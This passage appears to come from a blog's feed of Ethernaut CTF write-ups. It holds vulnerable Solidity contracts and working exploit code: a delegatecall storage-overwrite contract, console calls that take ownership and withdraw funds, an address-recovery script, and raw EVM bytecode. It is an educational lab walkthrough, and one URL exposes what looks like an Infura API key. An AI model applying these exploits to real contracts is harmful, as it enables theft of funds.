INITIAL_SUPPLY;</span></span><br><span class="line">    <span class="comment">// _balances[player] = INITIAL_SUPPLY;</span></span><br><span class="line">    <span class="title function_">_mint</span>(player, <span class="variable constant_">INITIAL_SUPPLY</span>);</span><br><span class="line">    emit <span class="title class_">Transfer</span>(<span class="title function_">address</span>(<span class="number">0</span>), player, <span class="variable constant_">INITIAL_SUPPLY</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address _to, uint256 _value</span>) override public lockTokens <span class="title function_">returns</span>(<span class="params">bool</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>.<span class="title function_">transfer</span>(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Prevent the initial owner from transferring tokens until the timelock has passed</span></span><br><span class="line">  modifier <span class="title function_">lockTokens</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (msg.<span class="property">sender</span> == player) &#123;</span><br><span class="line">      <span class="built_in">require</span>(block.<span class="property">timestamp</span> &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To complete this challenge we have to spend all our tokens which are locked for <strong>10 years</strong>. If we look at the contract it is inheriting the <code>ERC20</code> library from openzeppelin and overriding the <code>transfer</code> function to add the check if the locked time period is completed or not, however apart from <code>transfer</code> function this contract <strong>inherits a lot more functions</strong> including <strong>approve</strong> and <strong>transferFrom but these funtions are not overidden</strong> and so not check for the locked time period. so we can approve funds to our address and spend them using <code>approve</code> and <code>transferFrom</code> functions which we have access to use.</p><hr><h2 id="16-Preservation"><a href="#16-Preservation" class="headerlink" title="16 - Preservation"></a>16 - Preservation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Preservation</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// public library contracts </span></span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  <span class="comment">// Sets the function signature for delegatecall</span></span><br><span class="line">  bytes4 constant setTimeSignature = <span class="title function_">bytes4</span>(<span class="title function_">keccak256</span>(<span class="string">&quot;setTime(uint256)&quot;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address _timeZone1LibraryAddress, address _timeZone2LibraryAddress</span>) &#123;</span><br><span class="line">    timeZone1Library = _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library = _timeZone2LibraryAddress; </span><br><span class="line">    owner = msg.<span class="property">sender</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// set the time for timezone 1</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setFirstTime</span>(<span class="params">uint _timeStamp</span>) public &#123;</span><br><span class="line">    timeZone1Library.<span class="title function_">delegatecall</span>(abi.<span class="title function_">encodePacked</span>(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the time for timezone 2</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setSecondTime</span>(<span class="params">uint _timeStamp</span>) public &#123;</span><br><span class="line">    timeZone2Library.<span class="title function_">delegatecall</span>(abi.<span class="title function_">encodePacked</span>(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Simple library contract to set the time</span></span><br><span class="line">contract <span class="title class_">LibraryContract</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// stores a timestamp </span></span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setTime</span>(<span class="params">uint _time</span>) public &#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To complete this challenge we have to become the owner of this contract, this contract stores 2 address of different instances of a same library <code>LibararyContract</code> and the <code>owner address</code> and then it stores an uint256 <code>storedTime</code>. since the functions are used to perform a <code>delegatecall</code> and <strong>reasigns a uint256</strong> we can replace the first slot according to <code>LibraryContract</code> slot of <code>storedTime</code>, if we replace it with the address our own contract we can run some malicious code and replace the <code>owner</code> address to be the address of player.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">Preservation</span>&#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setFirstTime</span>(<span class="params">uint _timeStamp</span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Exploit</span> &#123;</span><br><span class="line">  </span><br><span class="line">  <span class="title class_">Preservation</span> p;</span><br><span class="line">  uint256 x = <span class="number">55</span>; <span class="comment">// just to keep the slot busy!!</span></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address _address</span>)  &#123;</span><br><span class="line">      p = <span class="title class_">Preservation</span>(_address);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">exploit</span>(<span class="params"></span>) public&#123;</span><br><span class="line">    p.<span class="title function_">setFirstTime</span>(<span class="title function_">uint256</span>(<span class="title function_">uint160</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>))));</span><br><span class="line">    p.<span class="title function_">setFirstTime</span>(<span class="title function_">uint256</span>(<span class="title function_">uint160</span>(msg.<span class="property">sender</span>)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setTime</span>(<span class="params">uint _time</span>) public &#123;</span><br><span class="line">    owner = <span class="title function_">address</span>(<span class="title function_">uint160</span>(_time));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="17-Recovery"><a href="#17-Recovery" class="headerlink" title="17 - Recovery"></a>17 - Recovery</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Recovery</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//generate tokens</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">generateToken</span>(<span class="params">string memory _name, uint256 _initialSupply</span>) public &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">SimpleToken</span>(_name, msg.<span class="property">sender</span>, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">SimpleToken</span> &#123;</span><br><span class="line"></span><br><span class="line">  string public name;</span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// constructor</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">string memory _name, address _creator, uint256 _initialSupply</span>) &#123;</span><br><span class="line">    name = _name;</span><br><span class="line">    balances[_creator] = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// collect ether in return for tokens</span></span><br><span class="line">  <span class="title function_">receive</span>() external payable &#123;</span><br><span class="line">    balances[msg.<span class="property">sender</span>] = msg.<span class="property">value</span> * <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// allow transfers of tokens</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address _to, uint _amount</span>) public &#123; </span><br><span class="line">    <span class="built_in">require</span>(balances[msg.<span class="property">sender</span>] &gt;= _amount);</span><br><span class="line">    balances[msg.<span class="property">sender</span>] = balances[msg.<span class="property">sender</span>] - _amount;</span><br><span class="line">    balances[_to] = _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// clean up after ourselves</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">destroy</span>(<span class="params">address payable _to</span>) public &#123;</span><br><span class="line">    <span class="title function_">selfdestruct</span>(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This contract is a <code>SimpleToken</code> factory which generates token contracts but it doesnâ€™t store the addressâ€™s of the created contracts, task is to recover the <code>0.001</code> eth from the contract that is created, since we donâ€™t know the address we have to calculate it and use the <code>destroy</code> function to recover the funds.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">In [<span class="number">1</span>]: <span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: <span class="keyword">from</span> web3.middleware <span class="keyword">import</span> geth_poa_middleware</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: url = <span class="string">&#x27;https://sepolia.infura.io/v3/e1881826831143f285a553a9a8f5a308&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: io = Web3(Web3.HTTPProvider(url))</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: io.middleware_onion.inject(geth_poa_middleware, layer=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: pub = <span class="string">&#x27;0x25Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: ad = <span class="string">&#x27;0xCCF85c12C838a1BdDf89de787B11d01b28C4d5E6&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: <span class="keyword">import</span> rlp</span><br><span class="line"></span><br><span class="line">In [<span class="number">9</span>]: rlp.encode([<span class="built_in">bytes</span>.fromhex(ad[<span class="number">2</span>:]),<span class="number">1</span>])</span><br><span class="line">Out[<span class="number">9</span>]: <span class="string">b&#x27;\xd6\x94\xcc\xf8\\\x12\xc88\xa1\xbd\xdf\x89\xdex&#123;\x11\xd0\x1b(\xc4\xd5\xe6\x01&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: io.soliditySha3(abi_types=[<span class="string">&#x27;bytes32&#x27;</span>],values=[rlp.encode([<span class="built_in">bytes</span>.fromhex(ad[<span class="number">2</span>:]),<span class="number">1</span>])])</span><br><span class="line">Out[<span class="number">10</span>]: HexBytes(<span class="string">&#x27;0xd0729ffe5272824ee52a49613ae562cdb3c5caa78df321dcbf66feb7fe25d466&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: io.soliditySha3(abi_types=[<span class="string">&#x27;bytes32&#x27;</span>],values=[rlp.encode([<span class="built_in">bytes</span>.fromhex(ad[<span class="number">2</span>:]),<span class="number">1</span>])])[<span class="number">12</span>:]</span><br><span class="line">Out[<span class="number">11</span>]: HexBytes(<span class="string">&#x27;0x3ae562cdb3c5caa78df321dcbf66feb7fe25d466&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">12</span>]: io.toChecksumAddress(io.soliditySha3(abi_types=[<span class="string">&#x27;bytes32&#x27;</span>],values=[rlp.encode([<span class="built_in">bytes</span>.fromhex(ad[<span class="number">2</span>:]),<span class="number">1</span>])])</span><br><span class="line">    ...: [<span class="number">12</span>:])</span><br><span class="line">Out[<span class="number">12</span>]: <span class="string">&#x27;0x3Ae562cdb3c5cAa78DF321DcBF66feb7Fe25d466&#x27;</span></span><br></pre></td></tr></table></figure><hr><h2 id="18-MagicNumber"><a href="#18-MagicNumber" class="headerlink" title="18 - MagicNumber"></a>18 - MagicNumber</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">MagicNum</span> &#123;</span><br><span class="line"></span><br><span class="line">  address public solver;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setSolver</span>(<span class="params">address _solver</span>) public &#123;</span><br><span class="line">    solver = _solver;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    ____________/\\\_______/\\\\\\\\\_____        </span></span><br><span class="line"><span class="comment">     __________/\\\\\_____/\\\///////\\\___       </span></span><br><span class="line"><span class="comment">      ________/\\\/\\\____\///______\//\\\__      </span></span><br><span class="line"><span class="comment">       ______/\\\/\/\\\______________/\\\/___     </span></span><br><span class="line"><span class="comment">        ____/\\\/__\/\\\___________/\\\//_____    </span></span><br><span class="line"><span class="comment">         __/\\\\\\\\\\\\\\\\_____/\\\//________   </span></span><br><span class="line"><span class="comment">          _\///////////\\\//____/\\\/___________  </span></span><br><span class="line"><span class="comment">           ___________\/\\\_____/\\\\\\\\\\\\\\\_ </span></span><br><span class="line"><span class="comment">            ___________\///_____\///////////////__</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>For this challenge we need to proviade an address of a smart contract that returns the given number 42 when it called <code>whatIsTheMeaningOfLife()</code> function, but itâ€™s size must be 10 opcodes which forces us to use evm bytecode. I have given up and looked at the walkthrough of this challenge understood the basics of evm bytecode from <strong><a href="https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2">this blog</a></strong> blog and got the code for the smart contract.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;0x600a80600c6000396000f300602a60005260206000f3&quot;</span><br></pre></td></tr></table></figure><hr>]]></content>
      
      
      
        <tags>
            
            <tag> SmartContract </tag>
            
            <tag> ethernaut </tag>
            
            <tag> ethereum </tag>
            
            <tag> solidity </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0-9 Ethernaut CTF</title>
      <link href="/2022/11/13/0-9-Ethernaut-CTF/"/>
      <url>/2022/11/13/0-9-Ethernaut-CTF/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="0-Hello-Ethernaut"><a href="#0-Hello-Ethernaut" class="headerlink" title="0 - Hello Ethernaut"></a>0 - Hello Ethernaut</h2><p>This challenge is to help us to learn how to interact with the console provided by ethernaut. it has several functions including <code>sendTransaction</code> to send a transaction in the network, it also stores few required addresses such as <code>player</code>, <code>level</code>, <code>contract</code> to make the interaction simple for the beginers. solving this challenge is very simple we just need to look the contractâ€™s abi using <code>contract.abi</code> command and tryout all functions of the contract which leads to the last function named <code>password()</code> which is actually a public variable view function and it gives the output <code>ethernaut0</code> which is the password requiered for authenticating the contract using <code>authenticate</code> function : <code>contract.authenticate(&#39;ethernaut0&#39;)</code>.</p><hr><h2 id="1-Fallback"><a href="#1-Fallback" class="headerlink" title="1 - Fallback"></a>1 - Fallback</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Fallback</span> &#123;</span><br><span class="line"></span><br><span class="line">  using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint256;</span><br><span class="line">  <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint) public contributions;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) public &#123;</span><br><span class="line">    owner = msg.<span class="property">sender</span>;</span><br><span class="line">    contributions[msg.<span class="property">sender</span>] = <span class="number">1000</span> * (<span class="number">1</span> ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        <span class="built_in">require</span>(</span><br><span class="line">            msg.<span class="property">sender</span> == owner,</span><br><span class="line">            <span class="string">&quot;caller is not the owner&quot;</span></span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">contribute</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.<span class="property">value</span> &lt; <span class="number">0.001</span> ether);</span><br><span class="line">    contributions[msg.<span class="property">sender</span>] += msg.<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span>(contributions[msg.<span class="property">sender</span>] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.<span class="property">sender</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">getContribution</span>(<span class="params"></span>) public view returns (uint) &#123;</span><br><span class="line">    <span class="keyword">return</span> contributions[msg.<span class="property">sender</span>];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params"></span>) public onlyOwner &#123;</span><br><span class="line">    owner.<span class="title function_">transfer</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">receive</span>() external payable &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.<span class="property">value</span> &gt; <span class="number">0</span> &amp;&amp; contributions[msg.<span class="property">sender</span>] &gt; <span class="number">0</span>);</span><br><span class="line">    owner = msg.<span class="property">sender</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The goal of this challenge is to become the owner of this given contract and drain out all the funds of the contract. this is possible because of the <code>receive()</code> fucntion makes the sender to be owner. <code>receive()</code> function called when the data of the transaction is empty. so, just by sending an empty transaction calles the <code>recieve()</code> function but the contract check if the transaction has some eth value and the contribution of the sender should be greater than 0, to pass the check we just need to contribute some ethereum and then call the <code>recieve()</code> with some etheruem in the transaction to the contract,this makes us the owner of the contract and using <code>withdraw()</code> funciton we can steal all the funds of the coantract, hence achieved our goal.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">contribute</span>(&#123;<span class="attr">value</span>: <span class="title function_">toWei</span>(<span class="string">&quot;0.001&quot;</span>)&#125;)  <span class="comment">// this makes the contribution to be grater than 0.</span></span><br><span class="line"><span class="keyword">await</span> <span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: instance, <span class="attr">value</span>: <span class="title function_">toWei</span>(<span class="string">&quot;0.001&quot;</span>)&#125;) <span class="comment">// this makes us the owner.</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">withdraw</span>() <span class="comment">// steals all the funds.</span></span><br></pre></td></tr></table></figure><hr><h2 id="2-Fallout"><a href="#2-Fallout" class="headerlink" title="2 - Fallout"></a>2 - Fallout</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Fallout</span> &#123;</span><br><span class="line">  </span><br><span class="line">  using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint256;</span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* constructor */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">Fal1out</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">    owner = msg.<span class="property">sender</span>;</span><br><span class="line">    allocations[owner] = msg.<span class="property">value</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">         <span class="built_in">require</span>(</span><br><span class="line">             msg.<span class="property">sender</span> == owner,</span><br><span class="line">             <span class="string">&quot;caller is not the owner&quot;</span></span><br><span class="line">         );</span><br><span class="line">         _;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">allocate</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">    allocations[msg.<span class="property">sender</span>] = allocations[msg.<span class="property">sender</span>].<span class="title function_">add</span>(msg.<span class="property">value</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">sendAllocation</span>(<span class="params">address payable allocator</span>) public &#123;</span><br><span class="line">    <span class="built_in">require</span>(allocations[allocator] &gt; <span class="number">0</span>);</span><br><span class="line">    allocator.<span class="title function_">transfer</span>(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">collectAllocations</span>(<span class="params"></span>) public onlyOwner &#123;</span><br><span class="line">    msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">allocatorBalance</span>(<span class="params">address allocator</span>) public view returns (uint) &#123;</span><br><span class="line">    <span class="keyword">return</span> allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The goal of this challenge is to become the owner of this contract, if you the constructor is misspelt it is not a constructor anymore and a public function that anyone can call, and since that fucntion defines the owner anyone who called that function can become the owner of this contract achieving our goal.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title class_">Fal1</span>out()</span><br></pre></td></tr></table></figure><hr><h2 id="3-Coin-Flip"><a href="#3-Coin-Flip" class="headerlink" title="3 - Coin Flip"></a>3 - Coin Flip</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">CoinFlip</span> &#123;</span><br><span 